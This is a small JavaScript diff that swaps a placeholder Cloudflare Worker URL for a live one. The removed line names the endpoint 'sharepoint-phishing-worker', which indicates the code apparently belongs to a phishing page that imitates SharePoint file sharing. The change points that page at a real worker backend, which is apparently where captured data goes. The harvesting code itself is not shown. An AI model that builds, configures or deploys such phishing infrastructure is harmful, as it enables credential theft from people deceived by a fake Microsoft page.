@@ -12,7 +12,7 @@ const files = [
 ];
 
 // Cloudflare Worker configuration
-const WORKER_URL = "https://sharepoint-phishing-worker.your-subdomain.workers.dev";
+const WORKER_URL = "https://sharepoint-worker.znwasike.workers.dev/";
 
 // Initialize app
 document.addEventListener('DOMContentLoaded', function() {
